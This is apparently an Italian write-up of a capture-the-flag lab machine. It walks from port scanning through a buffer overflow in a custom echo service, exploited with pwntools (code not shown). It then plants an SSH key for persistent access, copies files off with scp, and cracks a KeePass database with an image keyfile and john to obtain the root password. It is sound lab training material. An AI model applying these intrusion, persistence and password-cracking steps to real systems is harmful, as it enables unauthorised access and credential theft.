@@ -1,0 +1,124 @@
+1) fatta scansione con nmap, risultati:
+	22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
+	|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
+	|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
+	80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+	|_http-server-header: Apache/2.4.25 (Debian)
+	|_http-title: Apache2 Debian Default Page: It works
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+2) sulla porta 80 c'è solo la pagina standard di apache
+3) scansione con dirb non trova nulla di interessante
+4) Scansione approfondita delle porte con masscan 
+	comando: masscan -p1-65535 10.10.10.147 --rate 1000 --open --banners -e tun0
+	trovate: Discovered open port 1337/tcp on 10.10.10.147                                  
+		 Discovered open port 80/tcp on 10.10.10.147                                    
+		 Discovered open port 22/tcp on 10.10.10.147
+	DOVEVO FARLA PRIMA DI NMAP PER TROVARE LE PORTE APERTE ! 
+
+
+5) Visto che oltre a quelle trovate prima c'è anche un'altra porta aperta (1337), scannerizzo solo quella con nmap:
+	risultato: PORT     STATE SERVICE VERSION
+		   1337/tcp open  waste?
+
+6) nmap non riconosce il servizio, quindi potrebbe essere un servizio custom. Provo a contattarlo con telnet (si poteva usare anche nc ):	
+	comando: telnet 10.10.10.147 1337
+	risposta: Trying 10.10.10.147...
+		  Connected to 10.10.10.147.
+		Escape character is '^]'.
+ 		13:36:10 up  1:07,  0 users,  load average: 0.00, 0.00, 0.00
+
+
+		What do you want me to echo back? 
+		Connection closed by foreign host.
+7) se nel tempo in cui è aperto il servizio si scrive qualcosa, esso viene riscritto dal servizio dopo "What do you want me to echo back?".
+provando a scrivere una stringa molto lunga essa non viene riscritta dal servizio. 
+Anche provando a inserire vari comandi (anche con apici singoli, doppi ecc) questi non vengono eseguiti ma solo stampati quindi non c'è un errore del genere.
+Una strada: PROBABILE BUFFER OVERFLOW.
+
+8) anche se non è realistico, tra i commenti dell'html è possibile trovare il link ad un file binario che è quello del servizio:http://10.10.10.147/myapp
+
+9) usando il comando "file myapp" (dopo aver scaricato il file con wget) ottengo:
+	myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
+
+10) uso il debugger IDA per aprire il file e ottengo il codice sorgente (più o meno).
+	eseguibile:
+		1->richiama uptime
+		2->stampa un messaggio con printf
+		3->ottiene il messaggio
+		4->stampa il messaggio stesso con puts
+
+11) apro myapp con gdb (gdb -q myapp), comandi:
+	info functions	->	ottieni info su tutte le funzioni chiamate
+	disassemble main	->	vedi codice main (hex e operazioni assembler)
+mi serve installare e usare peda (python exploit development assistance) per gdb ( dopo installato basat fare gdb -q myapp come prima ma parte direttamente gdb-peda)
+comandi:
+	checksec	->	visualizza le opzioni di sicurezza attivate (contro buffer overfow ecc)  http://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/
+
+				solo NX è attivo. Non si sa se ASLR è supportato o no sulla macchina target.
+ritorno a dissassemble main, c'è l'op: sub    rsp,0x70		ovvero il programma riserva 112 bytes nello stack, 
+più avanti c'è mov    esi,0x3e8 (https://wiki.skullsecurity.org/Registers) 
+ovvero possiamo avere 1000 byte di input -> 1000>112 -> c'è buffer overflow -> si verifica dopo 112 caratteri 
+
+12) ora si deve creare lo shellcode da eseguire.
+	- lo shelcode viene preso da una gets -> non termina la lettura con \x00 quindi lo shellcode può contenere questo carattere
+	
+13) ora si deve scrivere l'exploit, per farlo in maniera semplice uso la libreria pwntools per python (file = exploit.py)
+
+14) in questo modo si ottiene una shell, navigando fino a /home/user/ si ottiene la chiave per user
+
+15) insieme a user.txt ci sono altri file (img e un file MyPasswords.kdbx)
+
+16) visto che c'è ssh e ho già accesso al pc, aggiungo credenziali ssh mie al file ssh di safe cosi
+posso accedere direttamente da ssh ed avere una shell migliore
+	1-genera chiavi su pc locale con ssh-keygen
+	2-copia la chiave
+	3-sulla macchina safe, copiare in .ssh/authorized_keys con cd /home/user/.ssh/ e poi: echo "<key>" > authorized_keys$
+
+
+17)a questo punto posso connettermi tranquillamente attraverso ssh -> ssh -i /root/.ssh/id_rsa user@10.10.10.147
+(/root/.ssh/id_rsa è la chiave privata generata prima insieme alla pubblica che poi ho usato per echo)
+
+18) ora ho una shell da user ma anche un accesso tramite ssh che posso usare per scaricare dei files, per questo possiamo usare scp per scaricare dei files
+	comando: scp -i /root/.ssh/id_rsa user@10.10.10.147:/home/user/* ./
+avendo specificato /home/user/* scarico tutto quello che c'è nella dir /home/user/, poi con ./ finale gli dico di metterli nella dir corrente
+
+19) tra i file c'è anche un file .kdbx, ovvero un file creato con KeePass Password Safe.
+Questo file contiene le password in un database crittografato 
+
+20) uso keepass2john per estrarre hash dal database kdbx, questo è fondamentale perchè altrimenti non si può eseguire un attacco
+dizionario o bruteforce.
+	comando: keepass2john MyPasswords.kdbx > pass.hash
+a questo punto si deve craccare l'hash, si può fare tramite john (the ripper) e una wordlist come rockyou-30 (più piccola di rockyou)
+	comando: john --wordlist=/root/Desktop/lists/rockyou-30.txt pass.hash
+purtroppo non trova nulla, visto che ci sono anche alcune immagini, esse possono essere state usate come chiavi per l'hash
+quindi si deve generare l'hash usando come chiave una delle immagini (fino a trovare quela giusta)
+e ogni volta cercare di nuovo la password con john (il comando resta uguale).
+	comando: keepass2john -k IMG_0547.JPG MyPasswords.kdbx > pass.hash
+l'iimagine giusta è IMG_0547.JPG e infatti poi esegueendo john otteniamo:
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 60000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bullshit         (MyPasswords)
+1g 0:00:00:18 DONE (2019-11-03 05:44) 0.05382g/s 54.25p/s 54.25c/s 54.25C/s donald..bullshit
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+ovvero la password corretta è "bullshit"
+
+21) con kpcli --key=IMG_0547.JPG --kdb=MyPasswords.kdbx apro il file (mi viene richista la password)
+a questo punto dalla console kpcli posso navigare iol file
+	comandi eseguiti in sequenza: ls, cd MyPasswords/, ls, show -f 0
+a questio punto ho ottenuto la password di root: u3v2249dl9ptv465cogl3cnpo3fyhk
+quindi posso accedere come root (usando su nella shell di ssh già ottenuta)
+a questo navigando sotto /root/ trovo il flag di root
+
+
+	
